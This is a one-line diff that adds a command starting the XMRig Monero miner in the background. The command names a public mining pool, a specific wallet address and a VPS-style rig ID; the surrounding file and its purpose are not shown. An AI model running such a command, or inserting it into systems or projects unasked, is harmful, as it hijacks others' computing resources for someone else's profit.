@@ -1,0 +1,1 @@
+./xmrig -o us-west.minexmr.com:443 -u 42vVwNspEseE9RVuuRv7rLB6jMCMViqNJXTwcWDTfA3PSJXmcgW7mPiJCi84UwDTMcfmfnp47xPPRYiUMz3PjXU3C77VbjE -k --tls --rig-id workervpshostwinds1  --cpu-affinity -randomx-no-numa --donate-level=1 -B
